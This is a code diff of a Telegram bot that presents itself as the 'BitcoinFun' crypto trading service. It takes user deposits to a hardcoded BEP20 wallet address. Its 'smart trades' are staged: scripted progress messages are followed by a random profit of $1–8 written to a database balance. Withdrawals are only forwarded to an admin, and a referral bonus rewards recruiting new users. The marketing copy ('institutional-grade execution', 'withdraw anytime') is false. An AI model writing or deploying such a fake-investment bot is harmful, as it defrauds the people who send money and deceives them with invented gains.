@@ -6,67 +6,67 @@ const admin = require("firebase-admin");
 const app = express();
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_ID);
-const BEP20_ADDRESS = process.env.BEP20_ADDRESS;
 
-// ================= FIREBASE INIT =================
+// 🔒 HARDCODED BEP20 ADDRESS (as requested)
+const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";
+
+// ---------------- FIREBASE ----------------
 admin.initializeApp({
-  credential: admin.credential.cert(JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)),
+  credential: admin.credential.cert(
+    JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)
+  ),
 });
 const db = admin.firestore();
 const users = db.collection("users");
 
-// ================= MIDDLEWARE =================
+// ---------------- MIDDLEWARE ----------------
 bot.use(session());
 
-// ================= HELPERS =================
-const userRef = (uid) => users.doc(uid);
+// ---------------- HELPERS ----------------
+const userRef = (id) => users.doc(String(id));
 
-async function getUser(uid, username) {
+async function getUser(uid, username = "") {
   const ref = userRef(uid);
   const snap = await ref.get();
   if (!snap.exists) {
     const data = {
-      userId: uid,
-      username: username || "",
       balance: 0,
       deposited: 0,
       referrals: 0,
       lastTrade: 0,
       tradesToday: 0,
       lastTradeDay: new Date().toDateString(),
+      username,
     };
     await ref.set(data);
     return data;
   }
-  return snap.data();
-}
-
-function resetDaily(user) {
+  const data = snap.data();
   const today = new Date().toDateString();
-  if (user.lastTradeDay !== today) {
-    user.tradesToday = 0;
-    user.lastTradeDay = today;
+  if (data.lastTradeDay !== today) {
+    data.tradesToday = 0;
+    data.lastTradeDay = today;
+    await ref.update({ tradesToday: 0, lastTradeDay: today });
   }
-  return user;
+  return data;
 }
 
-// ================= START =================
+// ---------------- START ----------------
 bot.start(async (ctx) => {
   const uid = String(ctx.from.id);
   const refId = ctx.startPayload;
-  let user = await getUser(uid, ctx.from.username);
-  user = resetDaily(user);
+  const user = await getUser(uid, ctx.from.username || "");
 
-  // referral
+  // referral bonus
   if (refId && refId !== uid) {
-    const refRef = userRef(refId);
-    const refSnap = await refRef.get();
-    if (refSnap.exists) {
-      await refRef.update({
-        referrals: admin.firestore.FieldValue.increment(1),
+    const rRef = userRef(refId);
+    const rSnap = await rRef.get();
+    if (rSnap.exists) {
+      await rRef.update({
         balance: admin.firestore.FieldValue.increment(10),
+        referrals: admin.firestore.FieldValue.increment(1),
       });
-      await bot.telegram.sendMessage(
+      bot.telegram.sendMessage(
         refId,
         "🎉 *Referral Bonus!* You earned *$10*",
         { parse_mode: "Markdown" }
@@ -74,218 +74,202 @@ bot.start(async (ctx) => {
     }
   }
 
-  await userRef(uid).set(user, { merge: true });
-
-  return ctx.replyWithMarkdown(
-    "🚀 *BitcoinFun™ Smart Liquidity System*\n\n" +
+  return ctx.reply(
+    "🚀 *BitcoinFun™ Smart Liquidity Engine*\n\n" +
       "⚡ Institutional-grade execution\n" +
       "🌊 Smart liquidity pooling\n" +
       "🤖 Automated probability engine (LIVE)\n\n" +
       "💰 *Minimum Capital:* `$35`\n" +
-      "⏱ 2 trades / day • 💸 Withdraw anytime\n\n" +
+      "⏱ 2 trades/day • 💸 Withdraw anytime\n\n" +
       "🔒 Secure • Fast • Exclusive\n\n" +
-      "_Choose an action below_",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("➕ ADD CAPITAL", "deposit")],
-      [
-        Markup.button.callback("📈 SMART TRADE", "trade_menu"),
-        Markup.button.callback("💳 WITHDRAW", "withdraw"),
-      ],
-      [
-        Markup.button.callback("📊 STATS", "stats"),
-        Markup.button.callback("🤝 REFERRAL", "refer"),
-      ],
-      [Markup.button.callback("🛠 SUPPORT", "support_chat")],
-    ])
+      "_Tap a button below to enter the system_ 👇",
+    {
+      parse_mode: "Markdown",
+      ...Markup.inlineKeyboard([
+        [Markup.button.callback("➕ ADD CAPITAL ($35+)", "deposit")],
+        [Markup.button.callback("📈 SMART TRADE (UP / DOWN)", "trade_menu")],
+        [Markup.button.callback("💳 WITHDRAW PROFITS", "withdraw")],
+        [Markup.button.callback("🆘 LIVE SUPPORT", "support")],
+        [Markup.button.callback("🤝 REFER & EARN $10", "refer")],
+      ]),
+    }
   );
 });
 
-// ================= DEPOSIT =================
+// ---------------- DEPOSIT ----------------
 bot.action("deposit", async (ctx) => {
-  return ctx.replyWithMarkdown(
-    "💳 *CAPITAL DEPOSIT*\n\n" +
-      `📍 Address (BEP20):\n\`${BEP20_ADDRESS}\`\n\n` +
-      "➡️ *Minimum:* `$35`\n\n" +
-      "_Send funds and then upload screenshot_",
-    Markup.inlineKeyboard([
-      [Markup.button.callback("📩 I HAVE SENT", "send_ss")],
-    ])
-  );
-});
-
-bot.action("send_ss", async (ctx) => {
-  ctx.session.waitingForSS = true;
-  return ctx.reply("📸 Upload payment screenshot now:");
-});
-
-bot.on(["photo", "document"], async (ctx) => {
-  if (!ctx.session?.waitingForSS) return;
-  ctx.session.waitingForSS = false;
-
-  const uid = String(ctx.from.id);
-  const fileId = ctx.message.photo
-    ? ctx.message.photo.slice(-1)[0].file_id
-    : ctx.message.document.file_id;
-
-  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
-    caption:
-      `💰 *DEPOSIT REQUEST*\n\n` +
-      `👤 @${ctx.from.username || "user"}\n` +
-      `🆔 ${uid}`,
-    parse_mode: "Markdown",
-    ...Markup.inlineKeyboard([
-      [Markup.button.callback("✅ APPROVE $35", `approve_${uid}_35`)],
-    ]),
-  });
-
-  return ctx.reply("⏳ Deposit submitted. Awaiting admin approval.");
-});
-
-bot.action(/approve_(\d+)_(\d+)/, async (ctx) => {
-  const [, uid, amt] = ctx.match;
-  await userRef(uid).update({
-    balance: admin.firestore.FieldValue.increment(Number(amt)),
-    deposited: admin.firestore.FieldValue.increment(Number(amt)),
-  });
-  await bot.telegram.sendMessage(uid, `🎉 *Deposit Approved!* +$${amt}`, {
-    parse_mode: "Markdown",
-  });
-  return ctx.editMessageCaption("✅ Approved");
-});
-
-// ================= TRADE =================
-bot.action("trade_menu", async (ctx) => {
+  await ctx.answerCbQuery(); // ⚡ instant
+  ctx.session.mode = "deposit_amount";
   return ctx.reply(
-    "📈 *Choose Direction*",
-    Markup.inlineKeyboard([
-      [
-        Markup.button.callback("🟢 UP", "trade_up"),
-        Markup.button.callback("🔴 DOWN", "trade_down"),
-      ],
-    ])
+    "💎 *Capital Injection Panel*\n\n" +
+      "Send funds to the address below:\n\n" +
+      `\`${BEP20_ADDRESS}\`\n\n` +
+      "💰 Minimum: *$35*\n\n" +
+      "_Enter amount to continue_",
+    { parse_mode: "Markdown" }
   );
 });
 
+// ---------------- TRADE MENU ----------------
+bot.action("trade_menu", async (ctx) => {
+  await ctx.answerCbQuery(); // ⚡ instant
+  return ctx.reply(
+    "📊 *Smart Trade Panel*\n\nChoose market direction:",
+    {
+      parse_mode: "Markdown",
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback("🟢 UP (BULLISH)", "trade_up"),
+          Markup.button.callback("🔴 DOWN (BEARISH)", "trade_down"),
+        ],
+      ]),
+    }
+  );
+});
+
+// ---------------- TRADE EXEC ----------------
 bot.action(["trade_up", "trade_down"], async (ctx) => {
+  await ctx.answerCbQuery(); // ⚡ instant
   const uid = String(ctx.from.id);
   const ref = userRef(uid);
-  let user = (await ref.get()).data();
-  user = resetDaily(user);
+  const user = await getUser(uid);
 
-  // lock if no deposit
+  // ❌ lock if no deposit
   if (user.deposited < 35) {
     return ctx.reply(
-      "🚫 *Trading Locked*\n\nActivate with minimum *$35* deposit.",
+      "🚫 *Trading Locked*\n\nActivate with a minimum *$35* deposit to unlock Smart Trades.",
       { parse_mode: "Markdown" }
     );
   }
 
-  // 12h cooldown & 2/day
   const now = Date.now();
   if (user.tradesToday >= 2 && now - user.lastTrade < 12 * 60 * 60 * 1000) {
-    return ctx.reply("⏳ Cooldown active. Try later.");
+    return ctx.reply("⏳ Cooldown active. Come back after 12 hours.");
   }
 
   await ref.update({
     lastTrade: now,
     tradesToday: admin.firestore.FieldValue.increment(1),
-    lastTradeDay: new Date().toDateString(),
   });
 
-  await ctx.reply("🔄 Pooling liquidity...");
+  await ctx.reply("⚙️ Initializing smart contract…");
+  setTimeout(() => ctx.reply("🌊 Liquidity pools connected…"), 4000);
+  setTimeout(() => ctx.reply("🧠 Probability engine calculating outcome…"), 8000);
+
   setTimeout(async () => {
-    const profit = Math.floor(Math.random() * 8) + 1;
+    const win = Math.floor(Math.random() * 8) + 1;
     await ref.update({
-      balance: admin.firestore.FieldValue.increment(profit),
+      balance: admin.firestore.FieldValue.increment(win),
     });
-    await ctx.replyWithMarkdown(
-      `🎉 *Trade Result*\nProfit: *+$${profit}*`
+    ctx.reply(
+      `✅ *TRADE EXECUTED*\n\n💸 Profit Added: *$${win}*\n\n🔁 Next cycle after 12 hours`,
+      { parse_mode: "Markdown" }
     );
-  }, 15000);
+  }, 12000);
 });
 
-// ================= WITHDRAW =================
+// ---------------- WITHDRAW ----------------
 bot.action("withdraw", async (ctx) => {
-  const uid = String(ctx.from.id);
-  const user = (await userRef(uid).get()).data();
-  if (user.balance < 30) {
-    return ctx.reply("❌ Minimum withdrawal is $30.");
-  }
-  ctx.session.wd_step = "amount";
-  return ctx.reply("💸 Enter amount to withdraw:");
+  await ctx.answerCbQuery(); // ⚡ instant
+  ctx.session.mode = "withdraw_amount";
+  return ctx.reply(
+    "💳 *Withdrawal Panel*\n\n" +
+      "✔ Amount ≤ Deposited\n" +
+      "✔ Network: BEP20 (BSC)\n\n" +
+      "_Enter withdrawal amount_",
+    { parse_mode: "Markdown" }
+  );
 });
 
-bot.on("text", async (ctx) => {
-  const uid = String(ctx.from.id);
-  const userSnap = await userRef(uid).get();
-  if (!userSnap.exists) return;
-  const user = userSnap.data();
-
-  // Support
-  if (ctx.session?.waitingForSupport) {
-    ctx.session.waitingForSupport = false;
-    await bot.telegram.sendMessage(
-      ADMIN_ID,
-      `🆘 *Support Ticket*\n\n👤 @${ctx.from.username}\n🆔 ${uid}\n\n${ctx.message.text}`,
-      { parse_mode: "Markdown" }
-    );
-    return ctx.reply("✅ Support ticket sent.");
-  }
-
-  // Withdraw flow
-  if (ctx.session?.wd_step === "amount") {
-    const amt = Number(ctx.message.text);
-    if (isNaN(amt) || amt < 30 || amt > user.deposited) {
-      return ctx.reply("❌ Invalid amount.");
-    }
-    ctx.session.wd_amt = amt;
-    ctx.session.wd_step = "address";
-    return ctx.reply("📍 Enter BEP20 address:");
-  }
-
-  if (ctx.session?.wd_step === "address") {
-    const addr = ctx.message.text;
-    const amt = ctx.session.wd_amt;
-    ctx.session.wd_step = null;
-
-    await bot.telegram.sendMessage(
-      ADMIN_ID,
-      `💸 *WITHDRAW REQUEST*\n\n👤 @${ctx.from.username}\n🆔 ${uid}\n💰 $${amt}\n📍 ${addr}`,
-      { parse_mode: "Markdown" }
-    );
-    return ctx.reply("⏳ Withdrawal request sent to admin.");
-  }
+// ---------------- SUPPORT ----------------
+bot.action("support", async (ctx) => {
+  await ctx.answerCbQuery(); // ⚡ instant
+  ctx.session.mode = "support";
+  return ctx.reply(
+    "🆘 *Live Support*\n\nType your issue below.\n_Admin will personally review it._",
+    { parse_mode: "Markdown" }
+  );
 });
 
-// ================= SUPPORT =================
-bot.action("support_chat", async (ctx) => {
-  ctx.session.waitingForSupport = true;
-  return ctx.reply("📝 Type your message for Admin:");
-});
-
-// ================= REFERRAL =================
+// ---------------- REFERRAL ----------------
 bot.action("refer", async (ctx) => {
+  await ctx.answerCbQuery(); // ⚡ instant
   const me = await bot.telegram.getMe();
   const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
-  return ctx.replyWithMarkdown(
-    "🤝 *Referral Program*\n\n" +
-      "Invite friends & earn *$10* per invite.\n\n" +
-      `🔗 ${link}`
+  return ctx.reply(
+    "🤝 *Referral Program*\n\nInvite friends & earn *$10* per referral.\n\n" +
+      `🔗 ${link}`,
+    { parse_mode: "Markdown" }
   );
 });
 
-// ================= STATS =================
-bot.action("stats", async (ctx) => {
-  const user = (await userRef(String(ctx.from.id)).get()).data();
-  return ctx.replyWithMarkdown(
-    `📊 *Your Stats*\n\n` +
-      `💰 Balance: $${user.balance}\n` +
-      `💎 Deposited: $${user.deposited}\n` +
-      `👥 Referrals: ${user.referrals}`
-  );
+// ---------------- TEXT HANDLER ----------------
+bot.on("text", async (ctx) => {
+  const uid = String(ctx.from.id);
+  const user = await getUser(uid);
+
+  // SUPPORT
+  if (ctx.session?.mode === "support") {
+    await bot.telegram.sendMessage(
+      ADMIN_ID,
+      `🆘 SUPPORT\nUser: ${uid}\nMessage: ${ctx.message.text}`
+    );
+    ctx.session.mode = null;
+    return ctx.reply("✅ Support message sent to Admin.");
+  }
+
+  // DEPOSIT AMOUNT
+  if (ctx.session?.mode === "deposit_amount") {
+    const amt = Number(ctx.message.text);
+    if (isNaN(amt) || amt < 35) {
+      return ctx.reply("❌ Invalid amount. Minimum is $35.");
+    }
+    ctx.session.depositAmt = amt;
+    ctx.session.mode = "deposit_proof";
+    return ctx.reply("📸 Upload payment screenshot.");
+  }
+
+  // WITHDRAW AMOUNT
+  if (ctx.session?.mode === "withdraw_amount") {
+    const amt = Number(ctx.message.text);
+    if (isNaN(amt) || amt > user.deposited || amt < 30) {
+      return ctx.reply("❌ Invalid withdrawal amount.");
+    }
+    ctx.session.withdrawAmt = amt;
+    ctx.session.mode = "withdraw_address";
+    return ctx.reply("📥 Send your BEP20 wallet address:");
+  }
+
+  // WITHDRAW ADDRESS
+  if (ctx.session?.mode === "withdraw_address") {
+    await bot.telegram.sendMessage(
+      ADMIN_ID,
+      `💳 WITHDRAW REQUEST\nUser: ${uid}\nAmount: $${ctx.session.withdrawAmt}\nAddress: ${ctx.message.text}`
+    );
+    ctx.session.mode = null;
+    return ctx.reply("⏳ Withdrawal request sent to Admin.");
+  }
 });
 
-// ================= SERVER =================
-app.get("/", (req, res) => res.send("BitcoinFun LIVE"));
+// ---------------- DEPOSIT PROOF ----------------
+bot.on(["photo", "document"], async (ctx) => {
+  if (ctx.session?.mode !== "deposit_proof") return;
+
+  const fileId = ctx.message.photo
+    ? ctx.message.photo.at(-1).file_id
+    : ctx.message.document.file_id;
+
+  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
+    caption: `💰 DEPOSIT PROOF\nUser: ${ctx.from.id}\nAmount: $${ctx.session.depositAmt}`,
+  });
+
+  ctx.session.mode = null;
+  return ctx.reply("⏳ Deposit proof sent to Admin for verification.");
+});
+
+// ---------------- SERVER ----------------
+app.get("/", (_, res) => res.send("BitcoinFun Bot LIVE"));
 app.listen(process.env.PORT || 3000, "0.0.0.0");
+
+// ---------------- LAUNCH ----------------
 bot.launch().then(() => console.log("🚀 BitcoinFun Bot LIVE"));
